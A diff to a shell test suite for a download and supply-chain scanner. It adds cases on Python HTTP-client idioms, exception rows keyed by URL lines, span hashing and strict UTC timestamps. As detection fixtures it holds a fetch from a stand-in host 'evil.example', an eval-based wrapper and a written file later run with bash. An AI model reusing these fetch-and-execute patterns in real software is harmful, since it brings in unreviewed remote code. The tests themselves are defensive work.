@@ -639,11 +639,17 @@ pcs+=("requests (from-import)|from requests import get\nget('$RU')")
 pcs+=("http.client|import http.client\nc = http.client.HTTPSConnection('github.com')\nc.request('GET', '/o/r/releases/download/v1.2.3/x.tgz')   # $RU")
 pcs+=("urllib3|import urllib3\nurllib3.PoolManager().request('GET', '$RU')")
 pcs+=("httpx|import httpx\nhttpx.get('$RU')")
+pcs+=("requests under an alias (import requests as r)|import requests as r\nr.get('$RU')")
+pcs+=("from http import client|from http import client\nclient.HTTPSConnection('github.com').request('GET', '$RU')")
+pcs+=("urllib.request|import urllib.request\nurllib.request.urlopen('$RU')")
 for pc in "${pcs[@]}"; do
   agentfile pyrel .github/agent/rel.py "$(printf '%b' "${pc#*|}")"$'\n'
   CASE="a .py file fetching a release URL through ${pc%%|*} is a download like a curl line: exit 1, unmeasured, never a plain release download"
   check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/pyrel.out"
 done
+agentfile pyrelplain .github/agent/rel.py "import json"$'\n'"URL = '$RU'"$'\n'"print(URL)"$'\n'
+CASE="AC2: a .py file with a release URL and NO network client import (only print(URL)) has no download finding: exit 0"
+check test "$rc" -eq 0; check test "$(grep -c 'FAIL' "$work/pyrelplain.out")" -eq 0
 agentfile agentlong .github/agent/l.sh "#!/bin/sh"$'\n'"echo $(printf 'a%.0s' $(seq 4100))"$'\n'
 CASE="a command line of 4100 characters makes the scan stop (exit 2), never read in part"
 check test "$rc" -eq 2; check grep -q 'is longer than the 4000 this check reads' "$work/agentlong.out"
@@ -2297,8 +2303,11 @@ PY
 # bhrun NAME CONTENT EXTRA: bin/bh.sh = CONTENT at the head; the row is the real scan's row plus the EXTRA json fields
 bhrun() {
   newcase "$1" "$(pyw bin/bh.sh "$2")"
+  bhrow "$1" "$3"
+}
+bhrow() { # NAME EXTRA: case NAME is built; its row is the real scan's plus the EXTRA json fields; bh_ms = wall time
   rtrows "$work/$1" "$work/bh-$1.tmp.json" all
-  python3 - "$work/bh-$1.tmp.json" "$work/bh-$1.json" "$3" <<'PY'
+  python3 - "$work/bh-$1.tmp.json" "$work/bh-$1.json" "$2" <<'PY'
 import json, sys
 src, out, extra = sys.argv[1:4]
 d = json.load(open(src))
@@ -2306,9 +2315,10 @@ assert len(d["unmeasured_text"]) == 1, d
 d["unmeasured_text"][0].update(json.loads(extra))
 json.dump(d, open(out, "w"))
 PY
-  rc=0
+  rc=0; local t0; t0=$(date +%s%N)
   python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" \
     --exceptions "$work/bh-$1.json" >"$work/bh.out" 2>&1 || rc=$?
+  bh_ms=$(( ($(date +%s%N) - t0) / 1000000 ))
 }
 bhyes() { # NAME CONTENT EXTRA: the line is ruled
   bhrun "$@"; CASE="AC16 body rows: $1: ruled (exit 0)"
@@ -2360,6 +2370,53 @@ for bad in '"body-sha256": ""' '"body-sha256": null' '"body-sha256": 5' '"body-s
   "\"body-sha256\": \"${sha^^}\"" '"context": "heredoc"' '"context": "comment", "proof": "x"' '"proof": "x"'; do
   bhbad "a row with all three fields and $bad" "$BH1" "$(bhf "$BHO" EOF "$SP1" "{$bad}")"
 done
+
+# --- REQ-SUP-001-AC2: the finding is the line that names the release URL (its text), never the import line
+RL1="requests.get('$RU')"; RL2="requests.get('${RU/v1.2.3/v1.2.4}')"
+agentfile r2row .github/agent/rel.py "import requests"$'\n'"$RL1"$'\n'
+rtrows "$work/r2row" "$work/r2row.json" all
+agentfile r2 .github/agent/rel.py "import requests"$'\n'"$RL1"$'\n'
+( cd "$work/r2" && printf 'import requests\n%s\n' "$RL2" >.github/agent/rel.py && git add -A \
+  && git -c user.name=t -c user.email=t@x commit -q -m v2 )
+edck r2 "$work/r2row.json"
+CASE="AC2: the base line with v1.2.3 is ruled by a row; the head moves only the URL to v1.2.4 under the same import: "
+CASE+="a new download finding for the v1.2.4 line, the old row rules nothing (exit 1)"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/rt.out"
+check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
+rtrows "$work/r2" "$work/r2new.json" all; edck r2 "$work/r2new.json"
+CASE="AC2 control: a row written for the v1.2.4 line itself rules it (exit 0): the finding is keyed by the URL line"
+check test "$rc" -eq 0; check grep -q 'ruled text' "$work/rt.out"
+
+# --- REQ-SUP-001-AC16, the search for a row's span is fast: a 176 KB file with one reviewed here-document span
+BIGPY='import pathlib
+t = "#!/bin/sh\n" + "".join("echo filler line %d\n" % i for i in range(9000))
+t += "cat >stub <<%sEOF%s\n" % (chr(39), chr(39))
+t += "echo \"curl $*\" >>\"$CALLS\"\nEOF\n"
+pathlib.Path("bin/bh.sh").write_text(t)'
+newcase bhbig "$BIGPY"
+test "$(wc -c <"$work/bhbig/bin/bh.sh")" -gt 176000
+bhrow bhbig "$(bhf "$BHO" EOF "$SP1")"
+CASE="AC16: a 176 KB file with one reviewed span is checked with its row (exit 0, ruled) in under 5 seconds "
+CASE+="(the search itself is under one second; the bound is wide so box load cannot flake it; regression guard)"
+check test "$rc" -eq 0; check test "$bh_ms" -lt 5000; check grep -q 'ruled text' "$work/bh.out"
+
+# --- REQ-SUP-001-AC16, a wrapper opener (check python3 - <<'PY'): only a wrapper bound by the hash of its definition
+CKDEF=$(grep -m1 '^check() {' "$here/pin-age-check-test.sh")
+WBODY="$BHL"
+WSPAN=$'check python3 - <<\'PY\'\n'"$WBODY"$'\nPY'
+BHW1=$'#!/bin/sh\n'"$CKDEF"$'\ncheck python3 - <<\'PY\'\n'"$WBODY"$'\nPY\n'
+BHW2=$'#!/bin/sh\ncheck() { eval "$@"; }\ncheck python3 - <<\'PY\'\n'"$WBODY"$'\nPY\n'
+bhyes "control: a span opened by check python3 - with the suite's own check() definition line" \
+  "$BHW1" "$(bhf "check python3 - <<'PY'" PY "$WSPAN")"
+bhno "a span opened by check python3 - where check() is defined differently (eval): wrapper not on the closed list" \
+  "$BHW2" "$(bhf "check python3 - <<'PY'" PY "$WSPAN")"
+
+# --- REQ-SUP-001-AC16, a file the span writes must not be used later except as data
+BHF1=$'#!/bin/sh\nf=stub\ncat >"$f" <<\'EOF\'\n'"$BHL"$'\nEOF\nbash "$f"\n'
+BHF2=$'#!/bin/sh\nf=stub\ncat >"$f" <<\'EOF\'\n'"$BHL"$'\nEOF\ngrep x "$f"\n'
+SPF=$'cat >"$f" <<\'EOF\'\n'"$BHL"$'\nEOF'
+bhyes "control: the written file is only read by grep later" "$BHF2" "$(bhf "cat >\"\$f\" <<'EOF'" EOF "$SPF")"
+bhno "the written file is run later (bash \"\$f\")" "$BHF1" "$(bhf "cat >\"\$f\" <<'EOF'" EOF "$SPF")"
 
 for f in bin/x.py .github/agent/x.py; do
   agentfile pyrow "$f" $'import urllib.request\nurllib.request.urlopen("https://evil.example/x")\n'
@@ -4393,7 +4450,8 @@ CASE="AC34: two rows for the same file and content: the check stops, it never pi
 check test "$rc" -eq 2
 check grep -qF 'repeats the row' "$work/fp.out"
 for sp in "no Z|2026-10-02T12:00:00" "+00:00 offset|2026-10-02T12:00:00+00:00" "fractional seconds|2026-10-02T12:00:00.000Z" \
-  "a space for the T|2026-10-02 12:00:00Z" "+02:00 offset|2026-10-02T12:00:00+02:00"; do
+  "a space for the T|2026-10-02 12:00:00Z" "+02:00 offset|2026-10-02T12:00:00+02:00" \
+  "Arabic-Indic digits for the year|٢٠٢٦-09-01T12:00:00Z"; do
   fpck strict "[$(fprow "$FPFILE" "$FPSUM" "$GRADLE" 9.7.1 "${sp#*|}")]"
   CASE="AC34: a published time with ${sp%%|*} (${sp#*|}) is not the one strict UTC form YYYY-MM-DDTHH:MM:SSZ: the row rules nothing (exit 1)"
   check test "$rc" -eq 1
